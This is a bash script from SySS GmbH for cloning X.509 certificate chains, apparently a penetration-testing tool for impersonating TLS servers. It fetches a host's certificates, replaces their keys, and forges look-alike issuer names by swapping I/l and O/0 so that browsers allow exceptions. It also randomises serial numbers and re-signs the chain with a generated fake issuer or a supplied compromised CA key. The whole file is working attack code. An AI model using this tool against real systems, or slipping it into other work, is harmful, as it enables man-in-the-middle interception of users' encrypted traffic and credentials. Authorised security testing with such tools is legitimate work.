#!/bin/bash
# Adrian Vollmer, SySS GmbH 2017-2019
# Reference:
# https://security.stackexchange.com/questions/127095/manually-walking-through-the-signature-validation-of-a-certificate
#
# MIT License
#
# Copyright (c) 2017-2019 Adrian Vollmer, SySS GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

set -e

DIR="/tmp"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

if [ "$1" = "" ] ; then
cat <<EOF
Usage: $0 [<sni>@]<host>:<port>|<pem-file> [<subject> <key>]

Clone an X509 certificate. The cloned certificate and the corresponding key
will be located in $DIR. Their filenames make up the output of this script.

The mandatory argument can either be a filename of an x509 certifcate in PEM
format, or a host name and a port number separated by a colon. Optionally, you
can precede this by a servername and an '@' if you want to specify the name
of the virtual host via SNI.

As optional parameters, you can specifiy the distinguished name of the
subject of a certificate and the corresponding private key in PEM format.
This script will clone all certificates in the chain below the compromised
one. The subject must match the form as in 'openssl x509 -noout -subject',
but without the 'subject=' string.

If none of the certificates in the chain have a subject name that matches
the one of the certificate that you control, the subject of the cloned host
certificate will be changed accordingly and it is assumed that your
certificate is a trust anchor.
EOF
    exit 1
fi

# set some variables
HOST="$1"
COMPROMISED_CA="$2"
COMPROMISED_KEY="$3"

EC_PARAMS=$(cat <<'END_HEREDOC'
-----BEGIN EC PARAMETERS-----
MIIBogIBATBMBgcqhkjOPQEBAkEAqt2duNvpxIs/1OauM8n8B8swjbOzydIO1mOc
ynAzCHF9TZsAm8ZoQq7NoSrmo4DmKIH/Ly2CxoUoqmBWWDpI8zCBhARAqt2duNvp
xIs/1OauM8n8B8swjbOzydIO1mOcynAzCHF9TZsAm8ZoQq7NoSrmo4DmKIH/Ly2C
xoUoqmBWWDpI8ARAfLu8+UQc+rduGJDkaITq4yH3DAvLSYFSeJdQS+w+NqYrzfoj
BJdlQPZFAIXy2uFFwiVTtGV2NokYDqJXGGdCPgSBgQRkDs5cEniHF7nBugbLwqb+
uoWEJFjFbd6dsXWNOcAxPYK6UXNc2z6kmap3p9aUOmT3o/Jf4m8GtRuqJpb6kDXa
W1NL1ZX1rw+iyJI3bISs4btOMBm3FjTAETEVnK4DzunZkyGEvu8ha9cd8trfhqYn
MG7P+W27i6zhmLYeAPizMgJBAKrdnbjb6cSLP9TmrjPJ/AfLMI2zs8nSDtZjnMpw
MwhwVT5cQUypJhlBhmEZf6wQRx2x04EIXdrdtYeWgpypAGkCAQE=
-----END EC PARAMETERS-----
END_HEREDOC
)


if [[ ! -z $COMPROMISED_KEY ]] ; then
    if [[ ! -f $COMPROMISED_KEY ]] ; then
        echo "File not found: $COMPROMISED_KEY" >&2
        exit 1
    fi
fi

set -u

if [[ -f "$HOST" ]] ; then
    CERTNAME="$(basename "$HOST")"
else
    CERTNAME="$HOST"
    SNI="${HOST%%@*}"
    if [ ! $SNI = $HOST ] ; then
        HOST="${HOST##*@}"
    fi
fi
rm -f "$DIR/${CERTNAME}_"*

function generate_rsa_key () {
    # create new RSA private/public key pair (re-use private key if applicable)
    local KEY_LEN="$1"
    local MY_PRIV_KEY="$2"
    local NEW_MODULUS=""

    openssl genrsa -out "$MY_PRIV_KEY" "$KEY_LEN" 2> /dev/null

    NEW_MODULUS="$(openssl rsa -in "$MY_PRIV_KEY" -pubout 2> /dev/null \
        | openssl rsa -pubin -noout -modulus \
        | sed 's/Modulus=//' | tr "[:upper:]" "[:lower:]" )"
    printf "%s" "$NEW_MODULUS"
}

function generate_ec_key () {
    # create new EC private/public key pair (re-use private key if applicable)
    local EC_PARAM_NAME="$1"
    local MY_PRIV_KEY="$2"

    openssl ecparam -name $EC_PARAM_NAME -genkey -out "$MY_PRIV_KEY" 2> /dev/null
    offset="$(openssl ec -in "$MY_PRIV_KEY" 2> /dev/null \
        | openssl asn1parse \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/')"
    NEW_MODULUS="$(openssl ec -in "$MY_PRIV_KEY" 2> /dev/null \
        | openssl asn1parse -offset $offset -noout \
            -out >(dd bs=1 skip=2 2> /dev/null | hexlify))"

    printf "%s" "$NEW_MODULUS"
}

function parse_certs () {
    # read the output of s_client via stdin and clone each cert
    # from https://stackoverflow.com/questions/45243785/script-wrapper-for-openssl-which-will-download-an-entire-certificate-chain-and
    nl=$'\n'

    state=begin
    counter=0
    while IFS= read -r line ; do
        case "$state;$line" in
          "begin;-----BEGIN CERTIFICATE-----" )
            # A certificate is about to begin!
            state=reading
            current_cert="$line"
            ;;

          "reading;-----END CERTIFICATE-----" )
            # Last line of a cert; save it and get ready for the next
            current_cert+="${current_cert:+$nl}$line"

            # ...and save it
            if [ ! -z "$current_cert" ] ; then
                printf "%s" "$current_cert" > "$DIR/${CERTNAME}_$counter"
            else
                echo "Error while parsing certificate" >&2
                exit 1
            fi
            counter=$((counter+=1))

            # no need to clone the other certs if we have no compromised CA
            if [[ -z $COMPROMISED_CA ]] ; then
                break
            fi

            state=begin
            current_cert=""
            ;;

          "reading;"* )
            # Otherwise, it's a normal part of a cert; accumulate it to be
            # written out when we see the end
            current_cert+="$nl$line"
            ;;
        esac
    done
}

function oid() {
    # https://bugzil.la/1064636
    case "$1" in
        # "300d06092a864886f70d0101020500")
        # ;;md2WithRSAEncryption
        "300b06092a864886f70d01010b") echo sha256
        ;;#sha256WithRSAEncryption
        "300b06092a864886f70d010105") echo sha1
        ;;#sha1WithRSAEncryption
        "300d06092a864886f70d01010c0500") echo sha384
        ;;#sha384WithRSAEncryption
        "300a06082a8648ce3d040303") echo sha384
        ;;#ecdsa-with-SHA384
        "300a06082a8648ce3d040302") echo sha256
        ;;#ecdsa-with-SHA256
        "300d06092a864886f70d0101040500") echo md5
        ;;#md5WithRSAEncryption
        "300d06092a864886f70d01010d0500") echo sha512
        ;;#sha512WithRSAEncryption
        "300d06092a864886f70d01010b0500") echo sha256
        ;;#sha256WithRSAEncryption
        "300d06092a864886f70d0101050500") echo sha1
        ;;#sha1WithRSAEncryption
        *) echo "Unknow Hash Algorithm OID: $1" >&2
            exit 1
        ;;
    esac
}


function hexlify(){
    xxd -p | tr -d '\n'
}

function unhexlify(){
    xxd -p -r
}

function asn1-bitstring(){
    # https://docs.microsoft.com/en-us/windows/desktop/seccertenroll/about-bit-string
    data=$1
    len=$((${#data}/2+1))
    if [ $len -le 127 ] ; then
        len=$(printf "%02x" $len)
    else
        if [ $len -lt 256 ] ; then
            len=$(printf "81%02x" $len)
        else
            len=$(printf "82%04x" $len)
        fi
    fi
    printf "03%s00%s" $len $data
}


function clone_cert () {
    local CERT_FILE="$1"
    local ISSUING_KEY="$2"
    SUBJECT="$(openssl x509 -in "$CERT_FILE" -noout -subject \
        | sed 's/.* CN = //g')"
    ISSUER="$(openssl x509 -in "$CERT_FILE" -noout -issuer \
        | sed 's/.* CN = //g')"
    ISSUER_DN="$(openssl x509 -in "$CERT_FILE" -noout -issuer -nameopt compat \
        | sed 's/^issuer=//')"

    SERIAL="$(openssl x509 -in "$CERT_FILE" -noout -serial \
        | sed 's/serial=//g' | tr '[A-F]' '[a-f]')"

    # if it is not self-signed and we have no compromised CA, change the
    # issuer or no browser will allow an exception.
    # it needs to stay the same length though.
    # also, the serial needs to be changed, because browsers keep track of
    # that.
    if [[ ! -f $ISSUING_KEY ]] && [[ $ISSUER != $SUBJECT ]]; then
        if [[ $ISSUER =~ I ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/I/l/")
        elif [[ $ISSUER =~ l ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/l/I/")
        elif [[ $ISSUER =~ O ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/O/0/")
        elif [[ $ISSUER =~ 0 ]] ; then
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/0/O/")
        else
            NEW_ISSUER=$(printf "%s" "$ISSUER" | sed "s/.$/ /")
        fi
        # avoid negative serial number
        # only change 16 hex digits in the middle
        NEW_SERIAL=$(openssl rand -hex 8)
        NEW_SERIAL=$(echo $SERIAL | sed "s/.\{16\}\(.\{4\}\)\$/$NEW_SERIAL\1/")
    else
        NEW_ISSUER=$ISSUER
        NEW_SERIAL=$SERIAL
    fi
    ISSUER=$(printf "%s" "$ISSUER" | hexlify)
    NEW_ISSUER=$(printf "%s" "$NEW_ISSUER" | hexlify)
    NEW_ISSUER_DN="$(echo "$ISSUER_DN" | hexlify | sed "s/$ISSUER/$NEW_ISSUER/" | unhexlify)"
    CLONED_CERT_FILE="${CERT_FILE}.cert"
    CLONED_KEY_FILE="${CERT_FILE}.key"
    FAKE_ISSUER_KEY_FILE="${CERT_FILE}.CA.key"
    FAKE_ISSUER_CERT_FILE="${CERT_FILE}.CA.cert"


    OLD_MODULUS="$(openssl x509 -in "$CERT_FILE" -modulus -noout \
        | sed -e 's/Modulus=//' | tr "[:upper:]" "[:lower:]")"
    if [[ $OLD_MODULUS = "wrong algorithm type" ]] ; then
        # it's EC and not RSA (or maybe DSA...)
        offset="$(openssl x509 -in "$CERT_FILE" -pubkey -noout 2> /dev/null \
            | openssl asn1parse \
            | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/')"
        OLD_MODULUS="$(openssl x509 -in "$CERT_FILE" -pubkey -noout 2> /dev/null \
            | openssl asn1parse -offset $offset -noout \
                -out >(dd bs=1 skip=2 2> /dev/null | hexlify))"
        EC_OID="$(openssl x509 -in "$CERT_FILE" -text -noout \
            | grep "ASN1 OID: " | sed 's/.*: //')"
        NEW_MODULUS="$(generate_ec_key "$EC_OID" "$CLONED_KEY_FILE")"
        if [ $ISSUER = $SUBJECT ] ; then
            FAKE_ISSUER_KEY_FILE="$CLONED_KEY_FILE"
            FAKE_ISSUER_CERT="$CLONED_CERT_FILE"
        else
            openssl req -x509 -new -nodes -days 1024 -sha256 \
                -newkey ec:<(echo "$EC_PARAMS") \
                -subj "$NEW_ISSUER_DN" \
                -keyout "$FAKE_ISSUER_KEY_FILE" \
                -out "$FAKE_ISSUER_CERT_FILE" 2> /dev/null
        fi
    else
        # get the key length of the public key
        KEY_LEN="$(openssl x509  -in "$CERT_FILE" -noout -text \
            | grep Public-Key: | grep -o "[0-9]\+")"
        NEW_MODULUS="$(generate_rsa_key "$KEY_LEN" "$CLONED_KEY_FILE")"
        # get the key length of the issuer's key (same as length of the signature)
        ISSUER_KEY_LEN="$(openssl x509  -in "$CERT_FILE" -noout -text \
            -certopt ca_default -certopt no_validity \
            -certopt no_serial -certopt no_subject -certopt no_extensions \
            -certopt no_signame | tail -n+2 | tr -d ": \n" | wc -c)"
        ISSUER_KEY_LEN=$((ISSUER_KEY_LEN/2*8))
        if [ $ISSUER = $SUBJECT ] ; then
            FAKE_ISSUER_KEY_FILE="$CLONED_KEY_FILE"
            FAKE_ISSUER_CERT_FILE="$CLONED_CERT_FILE"
        else
            openssl req -x509 -new -nodes -days 1024 -sha256 \
                -newkey rsa:$ISSUER_KEY_LEN \
                -subj "$NEW_ISSUER_DN" \
                -keyout "$FAKE_ISSUER_KEY_FILE" \
                -out "$FAKE_ISSUER_CERT_FILE" 2> /dev/null
        fi
    fi

    OLD_AUTH_KEY_IDENTIFIER="$(openssl asn1parse -in "$CERT_FILE" \
        | grep -A1 ":X509v3 Authority Key Identifier" | tail -n1 \
        | sed 's/.*\[HEX DUMP\]://' | tr '[:upper:]' '[:lower:]')"

    NEW_AUTH_KEY_IDENTIFIER="$(openssl asn1parse -in "$FAKE_ISSUER_CERT_FILE" \
        | grep -A1 ":X509v3 Subject Key Identifier" | tail -n1 \
        | sed 's/.*\[HEX DUMP\]://' | tr '[:upper:]' '[:lower:]')"

    # extract old signature
    offset="$(openssl asn1parse -in "$CERT_FILE" | grep SEQUENCE \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
    SIGNING_ALGO="$(openssl asn1parse -in "$CERT_FILE" \
        -strparse $offset -noout -out >(hexlify))"
    offset="$(openssl asn1parse -in "$CERT_FILE" \
        | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
    OLD_SIGNATURE="$(openssl asn1parse -in "$CERT_FILE" \
        -strparse $offset -noout -out >(hexlify))"
    OLD_TBS_CERTIFICATE="$(openssl asn1parse -in "$CERT_FILE" \
        -strparse 4 -noout -out >(hexlify))"

    # create new signature
    NEW_TBS_CERTIFICATE="$(printf "%s" "$OLD_TBS_CERTIFICATE" \
        | sed "s/$ISSUER/$NEW_ISSUER/" \
        | sed "s/$SERIAL/$NEW_SERIAL/" \
        | sed "s/$OLD_AUTH_KEY_IDENTIFIER/$NEW_AUTH_KEY_IDENTIFIER/" \
        | sed "s/$OLD_MODULUS/$NEW_MODULUS/")"
    # TODO replace Authority Key Identifier too

    digest="$(oid "$SIGNING_ALGO")"
    if [[ -f $ISSUING_KEY ]] ; then
        SIGNING_KEY="$ISSUING_KEY"
    else
        SIGNING_KEY="$FAKE_ISSUER_KEY_FILE"
    fi
    NEW_SIGNATURE="$(printf "%s" "$NEW_TBS_CERTIFICATE" | unhexlify \
        | openssl $digest -sign $SIGNING_KEY \
        | hexlify)"

    # replace signature, compute new asn1 length
    OLD_ASN1_SIG=$(asn1-bitstring $OLD_SIGNATURE)
    NEW_ASN1_SIG=$(asn1-bitstring $NEW_SIGNATURE)

    OLD_CERT_LENGTH="$(openssl x509 -in "$CERT_FILE" -outform der \
        | dd bs=2 skip=1 count=1 2> /dev/null | hexlify)"
    OLD_CERT_LENGTH=$((16#$OLD_CERT_LENGTH))
    NEW_CERT_LENGTH=$((OLD_CERT_LENGTH-${#OLD_ASN1_SIG}/2+${#NEW_ASN1_SIG}/2))
    OLD_CERT_LENGTH="$(printf "%04x" $OLD_CERT_LENGTH)"
    NEW_CERT_LENGTH="$(printf "%04x" $NEW_CERT_LENGTH)"

    OLD_AUTH_KEY_IDENTIFIER=$((${#OLD_AUTH_KEY_IDENTIFIER}/2))$OLD_AUTH_KEY_IDENTIFIER
    NEW_AUTH_KEY_IDENTIFIER=$((${#NEW_AUTH_KEY_IDENTIFIER}/2))$NEW_AUTH_KEY_IDENTIFIER
    openssl x509 -in "$CERT_FILE" -outform DER | hexlify \
        | sed "s/$OLD_MODULUS/$NEW_MODULUS/" \
        | sed "s/$ISSUER/$NEW_ISSUER/" \
        | sed "s/$SERIAL/$NEW_SERIAL/" \
        | sed "s/$OLD_AUTH_KEY_IDENTIFIER/$NEW_AUTH_KEY_IDENTIFIER/" \
        | sed "s/$OLD_ASN1_SIG/$NEW_ASN1_SIG/" \
        | sed "s/^\(....\)$OLD_CERT_LENGTH/\1$NEW_CERT_LENGTH/" \
        | unhexlify \
        | openssl x509 -inform DER -outform PEM > "$CLONED_CERT_FILE"
    if [ ! -s "$CLONED_CERT_FILE" ] ; then
        echo "Cloning failed" >&2
        rm "$CLONED_CERT_FILE"
        rm "$CLONED_KEY_FILE"
        exit 1
    fi
    printf "%s\n" "$CLONED_KEY_FILE"
    printf "%s\n" "$CLONED_CERT_FILE"
}


# save all certificates in chain
if [[ -f "$HOST" ]] ; then
    cat "$HOST" | parse_certs
else
    openssl s_client -servername "$SNI" \
        -verify 5 \
        -showcerts -connect "$HOST" < /dev/null 2>/dev/null | \
         parse_certs
fi

# clone them
for certfile in `ls -r "$DIR/${CERTNAME}_"*` ; do
    CERT="$(cat $certfile)"
    number="${certfile##*_}"
    signing_key="${certfile%_*}_((number+1)).key"
    if [[ -f $COMPROMISED_KEY ]] ; then
        ISSUER="$(openssl x509 -in "$certfile" -noout -issuer | sed 's/^issuer=//')"
        if [[ $ISSUER == $COMPROMISED_CA ]] ; then
            clone_cert "$certfile" "$COMPROMISED_KEY"
        else
            if [[ -f "$signing_key" ]] ; then
                clone_cert "$certfile" "$signing_key"
            fi
        fi
    else
        if [[ $number == "0" ]] ; then
            clone_cert "$certfile" ""
        fi
    fi
done

